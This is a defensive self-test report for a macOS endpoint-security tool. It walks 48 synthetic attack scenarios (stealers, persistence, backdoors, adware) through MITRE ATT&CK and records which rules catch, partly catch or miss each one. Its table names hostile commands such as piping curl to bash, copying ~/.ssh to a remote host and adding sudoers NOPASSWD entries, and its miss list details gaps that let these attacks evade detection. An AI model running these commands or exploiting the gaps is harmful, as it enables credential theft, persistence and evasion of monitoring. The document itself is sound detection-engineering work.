# Attack ideation X6: everyday Mac threats (2026-11-07)

Theme: the common macOS threats of 2025–26 (AMOS/Odyssey/Poseidon-style ClickFix stealers, fake DMG installers and
browser updates, adware and browser hijackers, cracked-app miners, Office macros, npm/PyPI stealers, SSH key theft,
cron/LaunchAgent/at persistence, sudoers/PAM/hidden-admin backdoors, rogue profiles and root CAs, DNS changers,
proxy and hosts hijacks), walked through MITRE ATT&CK for macOS by tactic.

Suite: `Sources/rampart-selftest/SelfTest+AttackX6.swift`, `static func attackX6Checks()`.
**Suites.swift line for the lead:** `("attackx6", SelfTest.attackX6Checks),`
Run: `RAMPART_NO_PRIVILEGED_TOOLS=1 .build-agents/out/Products/Debug/rampart-selftest attackx6`
(`X6_NOMUTE=1` skips EventHub muting, which shows which misses come from the pipeline and not the rules).

**Method.** Everything is inert. No process is spawned. Synthetic `SecurityEvent`s go through
`EventHub.shouldMute(_, policy: .standard)`, the policy rampartd uses, and then into a `BehaviourEngine`. So the
results show what the live daemon would see, not only what the rules can match. Fixture LaunchAgent plists point at
non-existent `com.rampart.test.*` paths. Web pages use `.test` hosts. The persistence scanner runs on a fixture home
with `runCommands: false`. Misses print a line and do not fail the suite. Only detections that work today are asserted.
Verified on a scratch build of the suite: 27 passed, 0 failed (33 with `X6_NOMUTE=1`).

Result rule: **caught** = every expected rule fired and confidence reached alert level (≥60, or ≥30 for log-tier
rules). **Partial** = something fired (≥30), usually only the generic "unsigned code in temp/hidden folder" R29 or
first-connection R41, not the technique itself. **Missed** = nothing at log level.

## Totals (live pipeline, with muting)
**48 scenarios: 16 caught, 13 partial, 19 missed.** Without muting: 19 caught / 13 partial / 16 missed.
Under muting, A40 is caught only because the Terminal ancestor is gone, so the ×0.3 "typed in a terminal" damping does not apply.

## Coverage matrix

| ID | ATT&CK tactic / technique | Scenario (kill chain) | Layer / rule that should catch it | Result | Evidence (rules, max confidence) |
|---|---|---|---|---|---|
| A01 | Initial access T1204.004 / Credential T1555 | AMOS ClickFix: Safari clipboard → Terminal `curl\|bash` → chmod+run /tmp/.c → osascript hidden-answer dialog → dscl -authonly → cp Login Data → ditto → curl POST | Behaviour R31, R34, R35, R38, R40, R43 | **Caught** (but R31 itself does not fire, see A02) | L03,L05,R29,R30,R34,R35,R37,R38,R40,R43 conf 100. R31 only without muting |
| A02 | Execution T1059.007 | ClickFix with a JXA `osascript -l JavaScript` downloader (no curl in argv); payload in `~/Library/Application Support/<name>/` (not hidden, not temp) | R31 ClickFix, R41 | **Partial** | R41 only, conf 45. **R31 cannot fire in the live pipeline:** Terminal.app's exec is muted (see top miss 1). Without muting: R31+R41, conf 99 |
| A03 | Initial access T1566 / Defense evasion T1553.001 | Fake DMG says "drag Install.command into Terminal": bash runs /Volumes script → curl -o /tmp → xattr -c → chmod → run | L01, R27, L05, R29 | **Caught** | L01,L05,R27,R29 conf 100 |
| A04 | Initial access T1189 | Fake "Chrome Update.app" run from a DMG asks for the password | L09, R34 | **Caught** | conf 100 |
| A05 | Defense evasion T1553.001 | Gatekeeper "Open Anyway" override → cracked app spawns `curl\|sh` | M02→R54, R30 | **Caught** | conf 84 |
| A06 | Initial access T1566.001 / Execution | Office macro: Microsoft Word → sh -c `curl\|python3` → network | L08 (browser→shell), R30 | **Partial** | R30 only, conf 40. Office apps are not in any "entry" list, so no L08-style rule exists |
| A07 | Persistence T1543.001 | Office sandbox escape: Word writes `~$com.x.plist` LaunchAgent that runs `/usr/bin/python3 -c urlopen…exec` | R07 | **Missed** | nothing. R07 judges the *target* binary (Apple python3 = trusted); interpreter + inline-code arguments are not assessed |
| A08 | Execution / Defense evasion T1027 | Pasted `python3 -c "exec(base64.b64decode(…))"` | L04 | **Missed** | L04 only matches `base64 -d \| sh` |
| A09 | Supply chain T1195.001 / Credential T1552.004 | npm postinstall (Homebrew node) reads `~/.ssh/id_ed25519`, `~/.aws/credentials`, looks up discord.com | R37, R42 | **Missed** | nothing: the default allowlist `pathPrefix: /opt/homebrew/, weakOnly` silences every weak rule for Homebrew binaries *and their descendants* (lineage rules) |
| A10 | Supply chain T1195.001 / T1555.003 | `pip install` → Apple `/usr/bin/python3 setup.py` opens Chrome Login Data + Cookies | R37 | **Missed** | R37's file-access matcher needs `trust: nonApple`; Apple's python3 is "apple" |
| A11 | Credential T1552.004 / Exfil T1048 | `tar czf /tmp/k.tgz -C ~ .ssh` + `curl -T` | R37, L03→R43 | **Partial** | L03,R43 conf 91. R37 does not see the `.ssh` directory (regex needs `id_*`) |
| A12 | Credential T1552.004 / Exfil | `scp -r ~/.ssh u@host:` | R37 | **Missed** | scp is in R37's processNot, and the path is a directory |
| A13 | Credential T1552.001/.004, Collection T1005 | Unsigned stealer reads .zsh_history, gh hosts.yml, .npmrc, docker config, .git-credentials, Messages chat.db, Safari History.db, ~/.gnupg | R37 | **Partial** | R29 only (dropper in /Users/Shared/.x), conf 59. None of these paths are in `sensitivePaths` |
| A14 | Collection T1005 / T1074 | AMOS FileGrabber: 30 Desktop docs + Passwords.kdbx copied to /tmp staging | R37 / collection burst | **Partial** | R29 only. No "mass document read + staging" rule; `.kdbx` not sensitive |
| A15 | Collection T1115 / Impact | Crypto clipboard swapper: unsigned agent loops `pbpaste\|sed\|pbcopy` | clipboard-hijack rule | **Missed** | nothing (agent in non-hidden App Support) |
| A16 | Persistence T1554 / Credential | Odyssey/AMOS style: unsigned tool rewrites `/Applications/Ledger Live.app/Contents/Resources/app.asar` | app-bundle tamper rule | **Partial** | R29 only (dropper in /tmp). No rule for third-party app bundle modification |
| A17 | Persistence T1543.001 | curl in paste chain writes LaunchAgent → hidden unsigned payload; launchctl bootstrap | R07, R08 | **Caught** | R07 conf 100 (R08 fires only without muting, because the Terminal lineage is lost) |
| A18 | Persistence T1543.001 | Unsigned dropper writes the LaunchAgent with `/usr/libexec/PlistBuddy` (no launchctl; runs at next login) | R07, R08 | **Partial** | R29 only: the PlistBuddy fileCreate is **muted** (Apple, not in neverMute), so the plist is never parsed. Caught without muting. The scheduled persistence scan finds it later (R07), with a delay |
| A19 | Persistence T1053.003 | `(crontab -l; echo …) \| crontab -` | R11 | **Caught** | R11,R30 conf 70 |
| A20 | Persistence T1053.002 | `at now + 1 minute` (file written by /usr/bin/at) | R11 | **Partial** | R29 only. The /usr/lib/cron/jobs write is muted and `at` has no exec matcher |
| A21 | Persistence T1546.004 | `~/.zshenv` gains `curl\|sh` | R12 | **Caught** | conf 70 |
| A22 | Privilege esc. T1548.003 | `echo NOPASSWD \| sudo tee /etc/sudoers.d/x` | R16 | **Caught** | R16 conf 75 (tee exec matcher; the tee file event is muted) |
| A23 | Credential T1556.003 / Persistence | PAM: `cp` over `/etc/pam.d/sudo` + new module in `/usr/local/lib/pam/` | R16 / PAM rule | **Missed** | nothing; no rule or persistence kind covers pam.d |
| A24 | Persistence T1136.001 / T1098 | Hidden admin: `sysadminctl -addUser .svc -admin`, `dscl … IsHidden 1`, `dseditgroup -a … admin` | account rule | **Missed** | nothing |
| A25 | Persistence T1098.004 | `echo key \| tee -a ~/.ssh/authorized_keys` | R14 | **Missed** | tee's file write is muted; R14 has no exec matcher (without muting: R14 partial, ×0.5 interactive) |
| A26 | Persistence T1547.015 | Pasted `osascript -e 'tell application "System Events" to make login item … hidden:true'` | L07 | **Missed** | L07 needs `lineageUntrusted`; Terminal lineage + paste mark lost to muting. Caught without muting (L07+R31) |
| A27 | Persistence (adware) T1176 | `defaults write com.google.Chrome ExtensionInstallForcelist` | R20 | **Caught** | R20,R29 conf 100 |
| A28 | Persistence (adware) T1176 | Adload/Shlayer: pkill Chrome, relaunch with `--load-extension=<hidden dir>` | R20 | **Partial** | R29 only. No `--load-extension` matcher |
| A29 | Persistence (adware) T1176 | Drop `Chrome/External Extensions/<id>.json` | R20 | **Partial** | R29 only. Path not in R20 |
| A30 | Defense evasion / C2 (DNS changer) | `networksetup -setdnsservers Wi-Fi 203.0.113.53` | R25 | **Caught** | conf 100 |
| A31 | Defense evasion (DNS changer) | `scutil` via stdin / direct write of `/Library/Preferences/SystemConfiguration/preferences.plist` | R25 | **Partial** | R29 only. Path not in R25 |
| A32 | Collection T1557 (proxy hijack) | `networksetup -setautoproxyurl` PAC | R25 | **Caught** | conf 100 |
| A33 | Defense evasion T1565.001 (hosts) | `sudo tee -a /etc/hosts` | R25 | **Missed** | tee's file write is muted; R25 has no `tee … /etc/hosts` exec matcher (caught without muting) |
| A34 | Defense evasion T1553.004 | `security add-trusted-cert -d -r trustRoot` | R24 | **Caught** | conf 80 |
| A35 | Defense evasion T1553.004 | `security trust-settings-import -d` | R24 | **Missed** | nothing |
| A36 | Persistence / T1553 (rogue profile) | Paste chain downloads + `open /tmp/p.mobileconfig` | R23 | **Missed** | R23's open matcher needs `lineageUntrusted`; the paste mark is lost with the Terminal lineage. Caught without muting. The install log line (ManagedClient) still catches the installation itself |
| A37 | Defense evasion T1562.004 | `socketfilterfw --setglobalstate off` | L06 | **Missed** | nothing in real time (Posture shows "firewall off" at the next posture scan) |
| A38 | Defense evasion T1070.002/.003 | `log erase --all`, delete `~/.zsh_history` | indicator-removal rule | **Partial** | R29 only (dropper in /tmp) |
| A39 | Persistence / Lateral T1021.005 | ARD `kickstart -activate -configure -access -on -privs -all` | R15 | **Missed** | R15 only knows ssh. Guard RemoteAccess may notice the service later; not tested here |
| A40 | Defense evasion T1562.001 | `pkill -9 rampartd` | R55 + Guard | **Caught** | R55 conf 85 |
| A41 | Impact T1496 | Ad-hoc-signed cracked app in /Applications runs an XMRig-style helper (`stratum+tcp`, port 3333) | miner rule | **Partial** | R41 only, conf 42. No miner indicators (args, pool ports, sustained CPU) |
| A42 | Impact T1496 | Hidden miner `…/.x/mdworker_shared` (masquerade) | R29, R41 | **Caught** | conf 100 (generic) |
| W01 | Initial access T1204.004 | ClickFix "verify you are human" page with an auto-copy curl\|bash | Web PageAnalyzer | **Caught** | likelyScam, score 99 |
| W02 | Initial access T1189 | Fake "Your Chrome is out of date, Update Chrome" page linking a .dmg | Web PageAnalyzer | **Missed** | likelySafe, score 0 |
| W03 | Initial access T1583.008 (malvertising) | Fake Notion download site serving a DMG, telling users to `xattr -c` | Web | **Missed** | likelySafe, score 0 (bare `xattr -c` in prose has no `-r` flag and so is not matched) |
| P01 | Impact (browser hijacker) | Chrome homepage/search/startup set to hijacker URLs | Posture BrowserHijackAudit | **Caught** | 3 suspicious findings |
| P02 | Persistence T1176 | Unpacked (location 4, `--load-extension`) + External Extensions Chrome extensions | PersistenceScanner | **Missed** | 0 of 2 found: only `<profile>/Extensions/<32-char id>/` is enumerated |
| P03 | Persistence (baseline) | Scheduled baseline of `/etc/sudoers.d`, `/etc/pam.d`, `/etc/hosts`, `/etc/resolver` | PersistenceScanner | **Missed** | no PersistenceItem kind reads these, so a change made while the daemon was down is never seen |

## Top 5 misses by severity

1. **High: Apple Terminal (and Script Editor) exec is muted, so ClickFix lineage is gone** (A01/A02/A17/A26/A36).
   `EventHub.shouldMute(.standard)` drops execs of platform binaries under `/System/` whose ppid is 1.
   `/System/Applications/Utilities/Terminal.app` and `Script Editor.app` fit that test. So no Terminal node exists,
   `ancestor: @terminals` never matches, and R31 (ClickFix) cannot fire for the built-in Terminal. The `pasteEntry`
   mark is never set, so R08/L07/R23 (which use it or `lineageUntrusted`) miss pasted chains too. Only the later
   stealer steps still score. → needs-telemetry.md T-X6-1.
2. **High: the default Homebrew allow silences npm/pip supply-chain stealers** (A09). `AllowEntry(pathPrefix: "/opt/homebrew/", weakOnly: true)`
   suppresses every weak rule (R37 credential read, R42 webhook, R30, R43 …) for Homebrew node/python and, for
   lineage rules, for any descendant. A malicious postinstall that reads SSH/AWS keys and posts to Discord makes no
   detection. → needs-behaviour.md B-X6-1.
3. **High: credential-file reads by Apple interpreters are invisible** (A10, A12, A13). R37's file matcher needs
   `trust: nonApple`, but most PyPI/osascript stealers use `/usr/bin/python3` or `osascript`. `sensitivePaths` also
   lacks shell history, gh/npm/docker/git tokens, GPG, Messages, Safari history, `.kdbx`, and `~/.ssh` as a
   directory. scp is exempt. → B-X6-2.
4. **Medium-High: backdoors through tools the hub mutes or no rule watches**: `tee` to /etc/hosts and authorized_keys
   (A25/A33), PlistBuddy LaunchAgents (A18), `at` (A20), PAM (A23), hidden admin users (A24), ARD kickstart (A39),
   trust-settings-import (A35), firewall off (A37). → T-X6-2, B-X6-3.
5. **Medium: adware / browser channels**: no `--load-extension` or External Extensions coverage (A28/A29/P02), no
   fake-browser-update or fake-download page heuristics (W02/W03), Office apps not treated as entry points (A06/A07),
   no miner indicators (A41). → B-X6-4, B-X6-5, web W-X6-1.
